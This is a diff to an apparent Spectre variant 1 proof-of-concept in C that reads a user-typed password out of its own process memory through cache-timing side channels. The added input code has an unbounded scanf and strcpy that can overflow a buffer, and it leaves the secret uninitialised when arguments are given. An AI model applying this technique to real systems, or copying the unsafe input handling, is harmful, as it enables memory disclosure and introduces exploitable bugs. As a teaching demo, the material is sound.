@@ -2,6 +2,7 @@
 #include <stdint.h>
 #include <string.h>
 #include <x86intrin.h> /* for rdtscp and clflush */
+#include <math.h>
 
 #define CACHE_HIT_THRESHOLD 80 /* assume cache hit if time <= threshold */
 #define PAGE_NUM 256
@@ -15,7 +16,9 @@ unsigned int array1_size = 16;
 uint8_t array1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
 uint8_t array2[PAGE_NUM * PAGE_SIZE];
 
-char* secret ="Spectre Attack by drdh.";
+//char* secret ="Spectre Attack by drdh.";
+
+
 uint8_t temp = 0; //使编译器不会优化下面的函数
 
 void victim_function(size_t x)
@@ -106,9 +109,23 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 	score[1] = results[k];
 }
 
+
+
 int main(int argc, const char* * argv)
 {
-	printf("Putting '%s' in memory, address %p\n", secret, (void *)(secret));
+
+	char *secret=(char *)malloc(30*sizeof(char));
+
+	if(argc==1)
+	{
+		printf("please enter password:\n");
+		char a[30];
+		scanf("%s",a);
+		strcpy(secret,a);
+
+		printf("Putting '%s' in memory, address %p\n", secret, (void *)(secret));
+	}
+
 	size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
 	int score[2], len = strlen(secret);
 	uint8_t value[2];
